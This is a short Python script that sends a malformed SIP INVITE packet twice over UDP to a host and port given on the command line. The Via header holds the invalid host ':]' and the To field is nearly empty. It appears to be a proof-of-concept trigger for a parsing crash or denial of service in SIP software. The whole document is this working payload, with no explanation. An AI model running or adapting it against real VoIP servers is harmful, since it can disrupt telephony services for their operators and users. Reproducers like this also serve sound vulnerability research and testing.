#!/usr/bin/env python
import socket
import sys

for _ in range(2):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect((sys.argv[1], int(sys.argv[2])))

    msg = "INVITE sip:0 SIP/2.0\n" \
        "To: 0\n" \
        "Via: SIP/2.0/UDP :]\n" \
        "\r\n"
    sock.sendall(msg)
